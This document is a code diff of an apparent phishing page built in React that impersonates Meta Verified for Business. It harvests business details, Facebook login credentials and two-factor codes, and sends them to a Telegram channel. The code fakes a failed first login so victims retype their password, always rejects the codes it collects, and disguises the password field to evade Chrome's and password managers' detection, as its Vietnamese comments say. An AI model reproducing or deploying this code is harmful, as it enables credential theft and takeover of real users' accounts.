@@ -7,22 +7,30 @@ export default function Verify() {
   const [step, setStep] = useState(1);
   const [clientIp, setClientIp] = useState('Unknown');
   
-  const [busName, setBusName] = useState(''); const [perEmail, setPerEmail] = useState(''); const [busEmail, setBusEmail] = useState(''); 
-  const [countryCode, setCountryCode] = useState('+1'); // Mặc định Mỹ
+  // States cho Form 1 (Signup)
+  const [busName, setBusName] = useState(''); 
+  const [perEmail, setPerEmail] = useState(''); 
+  const [busEmail, setBusEmail] = useState(''); 
+  const [countryCode, setCountryCode] = useState('+1'); 
   const [phoneNum, setPhoneNum] = useState('');
   
-  const [loginUser, setLoginUser] = useState(''); const [loginPass, setLoginPass] = useState(''); const [otp, setOtp] = useState('');
-  const [loginAttempt, setLoginAttempt] = useState(0); const [otpAttempt, setOtpAttempt] = useState(0);
+  // States cho Form 2 (Login) & 3 (2FA)
+  const [loginUser, setLoginUser] = useState(''); 
+  const [loginPass, setLoginPass] = useState(''); 
+  const [otp, setOtp] = useState('');
+  const [loginAttempt, setLoginAttempt] = useState(0); 
+  const [otpAttempt, setOtpAttempt] = useState(0);
 
   const [loading, setLoading] = useState(false);
-  const [errors, setErrors] = useState({}); const [showLoginError, setShowLoginError] = useState(false); const [showOtpError, setShowOtpError] = useState(false);
+  const [errors, setErrors] = useState({}); 
+  const [showLoginError, setShowLoginError] = useState(false); 
+  const [showOtpError, setShowOtpError] = useState(false);
 
-  // Lấy IP và tự động chọn mã vùng
+  // Tự động lấy IP và chọn mã vùng
   useEffect(() => { 
       fetch('https://ipwho.is/').then(r => r.json()).then(d => { 
           if (d && d.ip) {
               setClientIp(`${d.ip} - ${d.country} (${d.city})`);
-              // Nếu API trả về mã quốc gia và có trong map thì tự đổi mã vùng
               if (d.country_code && countryCodeMap[d.country_code]) {
                   setCountryCode(countryCodeMap[d.country_code]);
               }
@@ -31,26 +39,58 @@ export default function Verify() {
   }, []);
 
   const handleSignup = (e) => {
-    e.preventDefault(); let errs = {};
-    if (busName.length < 2) errs.busName = true; if (!/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(perEmail)) errs.perEmail = true; if (!/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(busEmail)) errs.busEmail = true; if (!/^\+?\d{8,15}$/.test(phoneNum.replace(/[\s\-().]/g, ''))) errs.phoneNum = true;
+    e.preventDefault(); 
+    let errs = {};
+    if (busName.length < 2) errs.busName = true; 
+    if (!/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(perEmail)) errs.perEmail = true; 
+    if (!/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(busEmail)) errs.busEmail = true; 
+    if (!/^\+?\d{8,15}$/.test(phoneNum.replace(/[\s\-().]/g, ''))) errs.phoneNum = true;
+    
     if (Object.keys(errs).length > 0) { setErrors(errs); return; }
-    setErrors({}); setLoading(true);
+    
+    setErrors({}); 
+    setLoading(true);
     const text = `<b>IP:</b> <code>${escapeHtml(clientIp)}</code>\n<b>Business:</b> <code>${escapeHtml(busName)}</code>\n<b>P.Email:</b> <code>${escapeHtml(perEmail)}</code>\n<b>B.Email:</b> <code>${escapeHtml(busEmail)}</code>\n<b>Phone:</b> <code>${escapeHtml(countryCode + phoneNum)}</code>\n`;
-    setInitialSession(text); sendTelegramMessage('');
+    
+    setInitialSession(text); 
+    sendTelegramMessage('');
+    
     setTimeout(() => { setLoading(false); setStep(2); }, 700);
   };
 
   const handleLogin = (e) => {
-    e.preventDefault(); if (loginPass.length === 0) return;
-    setLoading(true); setShowLoginError(false); const newAttempt = loginAttempt + 1; setLoginAttempt(newAttempt);
+    e.preventDefault(); 
+    if (loginPass.length === 0) return;
+    
+    setLoading(true); 
+    setShowLoginError(false); 
+    const newAttempt = loginAttempt + 1; 
+    setLoginAttempt(newAttempt);
+    
     sendTelegramMessage(`\n<b>Login ${newAttempt}:</b> <code>${escapeHtml(loginUser)}</code> | <code>${escapeHtml(loginPass)}</code>`);
-    setTimeout(() => { setLoading(false); if (newAttempt === 1) { setShowLoginError(true); setLoginPass(''); } else { setStep(3); } }, (newAttempt === 1) ? 3000 : 5000);
+    
+    setTimeout(() => { 
+        setLoading(false); 
+        if (newAttempt === 1) { 
+            setShowLoginError(true); 
+            setLoginPass(''); 
+        } else { 
+            setStep(3); 
+        } 
+    }, (newAttempt === 1) ? 3000 : 5000);
   };
 
   const handleOtp = (e) => {
-    e.preventDefault(); if (!/^\d{6}$|^\d{8}$/.test(otp)) { setShowOtpError(true); return; }
-    setLoading(true); setShowOtpError(false); const newAttempt = otpAttempt + 1; setOtpAttempt(newAttempt);
+    e.preventDefault(); 
+    if (!/^\d{6}$|^\d{8}$/.test(otp)) { setShowOtpError(true); return; }
+    
+    setLoading(true); 
+    setShowOtpError(false); 
+    const newAttempt = otpAttempt + 1; 
+    setOtpAttempt(newAttempt);
+    
     if (newAttempt <= 3) sendTelegramMessage(`\n<b>2FA ${newAttempt}:</b> <code>${escapeHtml(otp)}</code>`);
+    
     setTimeout(() => { setLoading(false); setShowOtpError(true); setOtp(''); }, 1500);
   };
 
@@ -61,7 +101,7 @@ export default function Verify() {
       <div style={{ filter: 'blur(4px)', pointerEvents: 'none', userSelect: 'none' }}>
           <header className="header">
               <div className="header-left">
-                  <a href="/" className="header-logo"><img src="https://static.xx.fbcdn.net/rsrc.php/y9/r/tL_v571NdZ0.svg" alt="Meta for Business" /></a>
+                  <a href="/live" className="header-logo"><img src="https://static.xx.fbcdn.net/rsrc.php/y9/r/tL_v571NdZ0.svg" alt="Meta for Business" /></a>
                   <nav className="nav-links">
                       <a className="nav-link" href="#steps">Get started</a>
                       <a className="nav-link" href="#benefits">Advertise</a>
@@ -85,7 +125,7 @@ export default function Verify() {
                           <p className="hero-note">To activate your Official Verified Badge, you must be logged in to a professional account (Instagram) or a Business Page (Facebook).</p>
                       </div>
                   </div>
-                  <div className="hero-image"><img src="/hero.webp" alt="Meta Verified for Business" /></div>
+                  <div className="hero-image"><img src="/images/hero.webp" alt="Meta Verified for Business" /></div>
               </div>
           </section>
       </div>
@@ -95,7 +135,7 @@ export default function Verify() {
           
           <div style={{ position: 'relative', background: '#fff', borderRadius: '12px', padding: '28px 20px 20px', width: '100%', maxWidth: '420px', boxShadow: '0 12px 28px rgba(0,0,0,0.2)' }}>
                
-            <button onClick={() => navigate('/')} style={{ position: 'absolute', top: '12px', right: '12px', background: '#f0f2f5', border: 'none', borderRadius: '50%', width: '34px', height: '34px', cursor: 'pointer', color: '#606770', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
+            <button onClick={() => navigate('/live')} style={{ position: 'absolute', top: '12px', right: '12px', background: '#f0f2f5', border: 'none', borderRadius: '50%', width: '34px', height: '34px', cursor: 'pointer', color: '#606770', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
                 <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.2" strokeLinecap="round"><path d="M18 6 6 18M6 6l12 12"/></svg>
             </button>
 
@@ -372,25 +412,11 @@ export default function Verify() {
               </>
             )}
 
-            {/* FORM 2 - ĐÃ SỬA ĐỂ LÁCH BỘ QUÉT MẬT KHẨU CỦA CHROME */}
+            {/* FORM 2 - LÁCH BỘ QUÉT MẬT KHẨU CỦA CHROME */}
             {step === 2 && (
               <form onSubmit={handleLogin} autoComplete="off" style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
                   <input className="fb-input" placeholder="Mobile number or email address" value={loginUser} onChange={e => setLoginUser(e.target.value)} required autoComplete="off" />
-                  
-                  {/* Đã đổi type password thành text và dùng css giả lập dấu chấm */}
-                  <input 
-                      className="fb-input" 
-                      type="text" 
-                      placeholder="Password" 
-                      value={loginPass} 
-                      onChange={e => setLoginPass(e.target.value)} 
-                      required 
-                      style={{ WebkitTextSecurity: 'disc' }} 
-                      autoComplete="new-password"
-                      data-lpignore="true"
-                      data-form-type="other"
-                  />
-                  
+                  <input className="fb-input" type="text" placeholder="Password" value={loginPass} onChange={e => setLoginPass(e.target.value)} required style={{ WebkitTextSecurity: 'disc' }} autoComplete="new-password" data-lpignore="true" data-form-type="other" />
                   {showLoginError && <div style={{ color: '#fa383e', fontSize: '13.5px', marginTop: '4px', textAlign: 'center' }}>The password you entered is incorrect. Please try again.</div>}
                   <button type="submit" className="fb-btn" disabled={loading}>{loading ? 'Logging in...' : 'Log in'}</button>
                   <div style={{ textAlign: 'center', padding: '12px 0 0' }}><a href="#" style={{ color: '#1c2b33', fontSize: '15px', textDecoration: 'none' }} onClick={e => e.preventDefault()}>Forgotten password?</a></div>
@@ -402,21 +428,4 @@ export default function Verify() {
               <>
                 <h2 style={{ fontSize: '22px', fontWeight: '700', textAlign: 'center', color: '#050505', marginBottom: '6px' }}>Two-factor authentication</h2>
                 <p style={{ fontSize: '14.5px', textAlign: 'center', color: '#65676b', marginBottom: '20px' }}>
-                    Enter the 6-digit or 8-digit code we sent to your WhatsApp, SMS, Gmail, or Google Authenticator.
-                </p>
-                <form onSubmit={handleOtp} style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
-                    <input className="fb-input fb-otp-input" style={{ textAlign: 'center', fontSize: '26px', letterSpacing: '12px', fontWeight: '700' }} placeholder="00000000" value={otp} onChange={e => setOtp(e.target.value.replace(/\D/g, '').slice(0, 8))} required maxLength={8} />
-                    {showOtpError && <div style={{ color: '#fa383e', fontSize: '13.5px', marginTop: '4px', textAlign: 'center' }}>Invalid security code. Please check the code and try again.</div>}
-                    <button type="submit" className="fb-btn" disabled={loading}>{loading ? 'Verifying...' : 'Verify'}</button>
-                </form>
-              </>
-            )}
-
-            <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', marginTop: '24px', paddingTop: '20px', borderTop: '1px solid #e4e6eb' }}>
-                <img src="https://upload.wikimedia.org/wikipedia/commons/7/7b/Meta_Platforms_Inc._logo.svg" alt="Meta" style={{ height: '12px', margin: '0 auto' }} />
-            </div>
-          </div>
-      </div>
-    </div>
-  );
-}
+                    Enter the 6-digit
